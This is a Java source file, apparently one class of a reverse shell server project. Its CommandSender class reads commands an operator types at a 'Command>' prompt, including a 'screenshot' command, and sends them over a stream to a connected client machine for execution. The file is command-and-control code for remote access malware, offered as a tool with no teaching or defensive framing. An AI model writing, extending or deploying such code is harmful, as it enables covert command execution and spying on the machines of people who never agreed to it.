package obs1d1anc1ph3r.reverseshell.server;

import java.io.*;

public class CommandSender implements Runnable {

    private PrintWriter out;
    private BufferedReader userInput;
    private ReverseShellServer server;

    public CommandSender(PrintWriter out, BufferedReader userInput, ReverseShellServer server) {
        this.out = out;
        this.userInput = userInput;
        this.server = server;
    }

    @Override
    public void run() {
        try {
            String command;
            System.out.print("\nCommand> ");
            while ((command = userInput.readLine()) != null) {
                if ("exit".equalsIgnoreCase(command)) {
                    sendCommand("exit");
                    server.cleanup();
                    break;
                }

                if ("screenshot".equalsIgnoreCase(command)) {
                    sendCommand("screenshot");
                } else {
                    sendCommand(command);
                }
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error reading command input: " + e.getMessage());
        } finally {
            cleanup();
        }
    }

    private void sendCommand(String command) {
        if (out != null) {
            out.println(command);
            out.flush();
            System.out.println("[-] Command sent: " + command);
        } else {
            System.err.println("[ERROR] Output stream is closed. Unable to send command.");
        }
    }

    private void cleanup() {
        try {
            if (out != null) {
                out.close();
                System.out.println("[-] Output stream closed.");
            }
        } catch (Exception e) {
            System.err.println("[ERROR] Error during cleanup: " + e.getMessage());
        }
    }
}
